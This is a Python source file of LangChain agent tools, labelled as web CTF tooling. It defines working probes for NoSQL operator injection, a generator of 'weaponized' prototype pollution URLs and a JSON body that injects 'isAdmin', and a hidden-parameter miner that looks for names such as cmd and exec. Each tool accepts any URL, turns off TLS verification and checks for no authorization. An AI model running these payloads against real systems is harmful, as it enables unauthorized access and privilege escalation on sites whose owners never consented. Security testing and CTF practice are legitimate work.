import json
import httpx
import asyncio
from datetime import datetime
from myth_config import load_dotenv
from langchain_core.tools import tool
from tools.utilities.report import format_industrial_result

load_dotenv()

# ==============================================================================
# 🌐 Esoteric Web CTF Tools
# ==============================================================================

@tool
async def nosql_logic_prober(url: str, parameter: str) -> str:
    """
    Probes for NoSQL logic bypass with socket safety and timeout management.
    """
    try:
        if not url.startswith("http"):
             raise ValueError("Absolute URL required for NoSQL probe.")

        payload = {"$gt": ""}
        async with httpx.AsyncClient(timeout=5, verify=False) as client:
            try:
                resp_json = await client.post(url, json={parameter: payload})
                resp_form = await client.post(url, data={f"{parameter}[$gt]": ""})
                
                vulnerable = (resp_json.status_code == 200 and "error" not in resp_json.text.lower()) or \
                             (resp_form.status_code == 200 and "error" not in resp_form.text.lower())

                return format_industrial_result(
                    "nosql_logic_prober",
                    "Vulnerable" if vulnerable else "Secure",
                    confidence=0.85,
                    impact="HIGH" if vulnerable else "LOW",
                    raw_data={"parameter": parameter, "responses": [resp_json.status_code, resp_form.status_code]},
                    summary=f"NoSQL logic probe complete. Result: {'OBJECT_BYPASS_DETECTED' if vulnerable else 'CLEAN'}."
                )
            except httpx.RequestError as e:
                return format_industrial_result("nosql_logic_prober", "Network Error", error=str(e))
    except Exception as e:
        return format_industrial_result("nosql_logic_prober", "Error", error=str(e))

@tool
async def prototype_pollution_payload_generator(url: str, parameter: str = "q") -> str:
    """
    Generates weaponized URLs for Prototype Pollution testing.
    Creates variants targeting __proto__, constructor, and prototype to inject properties.
    """
    try:
        if not url.startswith("http"):
             raise ValueError("Absolute URL required.")

        base = url.split("?")[0]
        payloads = [
            f"{base}?__proto__[polluted]=true",
            f"{base}?constructor[prototype][polluted]=true",
            f"{base}?__proto__.polluted=true",
            f"{base}#{parameter}=__proto__[polluted]=true" # Fragment variation
        ]
        
        # Deep Logic: JSON Payload generation for POST
        json_payload = {
            "constructor": {
                "prototype": {
                    "isAdmin": True,
                    "polluted": "true"
                }
            }
        }

        return format_industrial_result(
            "prototype_pollution_payload_generator",
            "Payloads Generated",
            confidence=1.0,
            impact="HIGH",
            raw_data={"url_variants": payloads, "json_body": json_payload},
            summary=f"Generated {len(payloads)} prototype pollution vectors for {url}. Ready for active injection."
        )
    except Exception as e:
        return format_industrial_result("prototype_pollution_payload_generator", "Error", error=str(e))

@tool
async def param_miner_lite(url: str) -> str:
    """
    Mines for hidden parameters with enforced baseline stability checks.
    """
    try:
        if not url.startswith("http"): 
             raise ValueError("Target URL must be absolute.")

        common_params = ["debug", "admin", "test", "file", "path", "id", "cmd", "exec", "source"]
        findings = []
        
        async with httpx.AsyncClient(timeout=5, verify=False) as client:
            try:
                base = await client.get(url)
                base_len = len(base.text)
            except httpx.RequestError:
                 return format_industrial_result("param_miner_lite", "Baseline Failure", error="Target unreachable during baseline establishing.")
            
            sem = asyncio.Semaphore(5)
            async def check_param(p):
                async with sem:
                    try:
                        res = await client.get(url, params={p: "1"})
                        if abs(len(res.text) - base_len) > 10: # Significance delta
                            return {"param": p, "diff": len(res.text) - base_len}
                    except: pass
                return None

            tasks = [check_param(p) for p in common_params]
            results = await asyncio.gather(*tasks)
            findings = [r for r in results if r]

        return format_industrial_result(
            "param_miner_lite",
            "Found" if findings else "Clean",
            confidence=0.8,
            impact="MEDIUM" if findings else "LOW",
            raw_data={"findings": findings},
            summary=f"Safe parameter mining finished for {url}. Identified {len(findings)} variance triggers."
        )
    except Exception as e:
        return format_industrial_result("param_miner_lite", "Error", error=str(e))
